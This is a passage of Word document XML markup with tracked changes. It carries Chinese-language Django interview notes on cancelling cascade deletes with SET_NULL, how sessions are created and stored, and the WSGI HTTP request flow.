                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:bookmarkStart w:id="173" w:name="_label2-21"/>
        <w:bookmarkEnd w:id="173"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="179FA8BB" w14:textId="5EDCD5AD" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00D2274A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="174" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="175" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>023</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何取消级联</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6318C0BC" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:pPrChange w:id="176" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="177" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="47A6CBFB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00FC55DF" w:rsidRDefault="00717181" w:rsidP="00FC55DF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Django取消级联删除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EC344C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00FC55DF" w:rsidRDefault="00717181" w:rsidP="00FC55DF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>这个文档写的比较清楚：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549F38D3" w14:textId="360F2C30" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pPrChange w:id="178" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6141B0DF" wp14:editId="2C222C6D">
            <wp:extent cx="6219825" cy="219075"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="99" name="图片 99" descr="来自非专业Python讲师的一份Django考题，面试无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来自非专业Python讲师的一份Django考题，面试无忧！"/>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19825" cy="219075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51049014" w14:textId="77777777" w:rsidR="00FC55DF" w:rsidRPr="00FC55DF" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00FC55DF">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:del w:id="179" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>并且</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SET_NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>只有在</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的时候，才可以使用</w:t>
      </w:r>
      <w:r w:rsidR="00FC55DF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidR="00FC55DF" w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在父表被删除，null为True的时候就会取消级联</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="4A357A2F" w14:textId="249494F2" w:rsidR="00717181" w:rsidRPr="00FC55DF" w:rsidRDefault="00FC55DF" w:rsidP="00FC55DF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:del w:id="180" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidR="00717181" w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2B50552C" w14:textId="2F9B9A33" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00D2274A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="181" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="182" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>024</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中如何读取和保存</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，整个</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的运行机制是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E03CDF" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:pPrChange w:id="183" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="184" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="439D08A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 更新</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2CB1A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">     在django—session表中创建一条记录:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEA5F52" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">       session-key                                     session-data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CE951C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">       ltv8zy1kh5lxj1if1fcs2pqwodumr45t                  更新数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7983E6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C971D36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    1 生成随机字符串   ltv8zy1kh5lxj1if1fcs2pqwodumr45t</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75211A11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    2 response.set_cookie("sessionid",ltv8zy1kh5lxj1if1fcs2pqwodumr45t)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6DE45A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    3 在django—session表中创建一条记录:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1C401E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">       session-key                                     session-data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AA65C3" w14:textId="44874031" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">       ltv8zy1kh5lxj1if1fcs2pqwodumr45t       {"is_login":True,"username":"yuan"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F99EFD" w14:textId="5D251455" w:rsidR="00717181" w:rsidRDefault="00D2274A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="185" w:author="ABM ABM" w:date="2020-08-16T13:43:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求的执行流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D552DF2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    在接受一个Http请求之前的准备,启动一个支持WSGI网关协议的服务器监听端口等待外界的Http请求，比如Django自带的开发者服务器或者uWSGI服务器。</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D0752E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    服务器根据WSGI协议指定相应的Handler来处理Http请求，并且初始化该Handler，在Django框架中由框架自身负责实现这一个Handler。</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>此时服务器已处于监听状态，可以接受外界的Http请求</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>当一个http请求到达服务器的时候</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532C3E80" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    服务器根据WSGI协议从Http请求中提取出必要的参数组成一个字典（environ）并传入Handler中进行处理。</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636697B4" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="186" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    在Handler中对已经符合WSGI协议标准规定的http请求进行分析，比如加载Django提供的中间件，路由分配，调用路由匹配的视图等。</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>返回一个可以被浏览器解析的符合Http协议的HttpResponse。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BB3E84" w14:textId="13B66475" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65426D97" w14:textId="4C06339E" w:rsidR="00717181" w:rsidRPr="00A1017F" w:rsidDel="00A1017F" w:rsidRDefault="00D2274A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="187" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="188" w:author="ABM ABM" w:date="2020-08-16T13:44:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
